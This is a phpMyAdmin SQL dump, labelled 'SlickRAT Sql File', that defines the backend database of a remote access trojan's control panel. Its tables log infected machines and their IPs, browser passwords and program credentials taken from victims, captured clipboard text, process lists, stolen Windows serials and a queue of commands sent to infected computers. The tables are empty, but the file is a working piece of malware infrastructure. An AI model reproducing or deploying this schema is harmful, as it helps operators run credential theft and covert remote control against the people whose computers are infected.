-- phpMyAdmin SQL Dump
-- version 3.3.9
-- http://www.phpmyadmin.net
--
-- Machine: localhost
-- Genereertijd: 10 Feb 2011 om 00:45
-- Serverversie: 5.5.8
-- PHP-Versie: 5.3.5

--
-- SlickRAT Sql File.
--
SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `slickrat`
--

-- --------------------------------------------------------

--
-- Tabelstructuur voor tabel `_bots`
--

CREATE TABLE IF NOT EXISTS `_bots` (
  `Peak` int(25) NOT NULL AUTO_INCREMENT,
  `ID` varchar(36) DEFAULT NULL,
  `UserPC` varchar(50) DEFAULT NULL,
  `WanIP` varchar(18) DEFAULT NULL,
  `OperatingSystem` varchar(26) DEFAULT NULL,
  `UniqueID` varchar(38) DEFAULT NULL,
  `Country` varchar(20) DEFAULT NULL,
  `Date` varchar(60) DEFAULT NULL,
  PRIMARY KEY (`Peak`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

--
-- Gegevens worden uitgevoerd voor tabel `_bots`
--


-- --------------------------------------------------------

--
-- Tabelstructuur voor tabel `_brws`
--

CREATE TABLE IF NOT EXISTS `_brws` (
  `Peak` int(25) NOT NULL AUTO_INCREMENT,
  `Type` varchar(70) DEFAULT NULL,
  `Weburl` varchar(70) DEFAULT NULL,
  `User` varchar(70) DEFAULT NULL,
  `Password` varchar(70) DEFAULT NULL,
  `UniqueID` varchar(60) DEFAULT NULL,
  `Date` varchar(20) DEFAULT NULL,
  PRIMARY KEY (`Peak`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

--
-- Gegevens worden uitgevoerd voor tabel `_brws`
--


-- --------------------------------------------------------

--
-- Tabelstructuur voor tabel `_clip`
--

CREATE TABLE IF NOT EXISTS `_clip` (
  `Peak` int(70) NOT NULL AUTO_INCREMENT,
  `Value` longtext,
  `UniqueID` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`Peak`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

--
-- Gegevens worden uitgevoerd voor tabel `_clip`
--


-- --------------------------------------------------------

--
-- Tabelstructuur voor tabel `_cmds`
--

CREATE TABLE IF NOT EXISTS `_cmds` (
  `Peak` int(70) NOT NULL AUTO_INCREMENT,
  `Command` varchar(70) DEFAULT NULL,
  `Value` varchar(70) DEFAULT NULL,
  `UniqueID` varchar(70) DEFAULT NULL,
  PRIMARY KEY (`Peak`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

--
-- Gegevens worden uitgevoerd voor tabel `_cmds`
--


-- --------------------------------------------------------

--
-- Tabelstructuur voor tabel `_fail`
--

CREATE TABLE IF NOT EXISTS `_fail` (
  `Peak` int(70) NOT NULL AUTO_INCREMENT,
  `IP` varchar(70) DEFAULT NULL,
  `Date` varchar(60) DEFAULT NULL,
  PRIMARY KEY (`Peak`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

--
-- Gegevens worden uitgevoerd voor tabel `_fail`
--


-- --------------------------------------------------------

--
-- Tabelstructuur voor tabel `_pinfo`
--

CREATE TABLE IF NOT EXISTS `_pinfo` (
  `Peak` int(255) NOT NULL AUTO_INCREMENT,
  `Value` varchar(255) DEFAULT NULL,
  `UniqueID` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`Peak`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

--
-- Gegevens worden uitgevoerd voor tabel `_pinfo`
--


-- --------------------------------------------------------

--
-- Tabelstructuur voor tabel `_prcs`
--

CREATE TABLE IF NOT EXISTS `_prcs` (
  `Peak` int(70) NOT NULL AUTO_INCREMENT,
  `Value` mediumtext,
  `UniqueID` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`Peak`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

--
-- Gegevens worden uitgevoerd voor tabel `_prcs`
--


-- --------------------------------------------------------

--
-- Tabelstructuur voor tabel `_prg`
--

CREATE TABLE IF NOT EXISTS `_prg` (
  `Peak` int(70) NOT NULL AUTO_INCREMENT,
  `Type` varchar(255) NOT NULL,
  `Host` varchar(255) NOT NULL,
  `User` varchar(255) NOT NULL,
  `Password` varchar(255) NOT NULL,
  `UniqueID` varchar(255) NOT NULL,
  `Date` varchar(255) NOT NULL,
  UNIQUE KEY `Peak` (`Peak`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

--
-- Gegevens worden uitgevoerd voor tabel `_prg`
--


-- --------------------------------------------------------

--
-- Tabelstructuur voor tabel `_sts`
--

CREATE TABLE IF NOT EXISTS `_sts` (
  `UniqueID` varchar(52) DEFAULT NULL,
  `Status` varchar(52) DEFAULT NULL,
  KEY `UniqueID` (`UniqueID`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Gegevens worden uitgevoerd voor tabel `_sts`
--


-- --------------------------------------------------------

--
-- Tabelstructuur voor tabel `_wstlr`
--

CREATE TABLE IF NOT EXISTS `_wstlr` (
  `Peak` int(25) NOT NULL AUTO_INCREMENT,
  `Serial` varchar(50) DEFAULT NULL,
  `OperatingSystem` varchar(50) DEFAULT NULL,
  PRIMARY KEY (`Peak`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

--
-- Gegevens worden uitgevoerd voor tabel `_wstlr`
--

